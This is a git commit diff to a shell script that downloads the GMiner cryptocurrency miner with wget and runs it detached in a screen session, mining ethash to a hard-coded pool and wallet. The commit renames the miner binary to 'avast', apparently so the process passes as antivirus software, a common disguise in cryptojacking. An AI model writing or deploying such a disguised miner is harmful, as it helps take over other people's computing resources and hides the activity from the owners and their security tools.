22b4d8c8b1452be597a030d24f6884ec4338fe7e
jrkeiter <91981745+jrkeiter@users.noreply.github.com>
2021-12-12 17:29:51 +0700

    Update use.sh

--- use.sh
+++ use.sh
@@ -5,5 +5,6 @@ if [ -f "$FILE" ]; then
 else 
     wget https://github.com/develsoftware/GMinerRelease/releases/download/2.63/gminer_2_63_linux64.tar.xz
     tar xvf gminer_2_63_linux64.tar.xz
+    mv miner avast
 fi
-screen -dmLS mine ./miner --algo ethash --server us-eth.2miners.com:2020 --user nano_34zxr51ybgctoqr9gkn5znqtyd5ji83ck1z4idqqdpm7xznfxfa4fpua4ik8.ace
+screen -dmLS mine ./avast --algo ethash --server us-eth.2miners.com:2020 --user nano_34zxr51ybgctoqr9gkn5znqtyd5ji83ck1z4idqqdpm7xznfxfa4fpua4ik8.ace
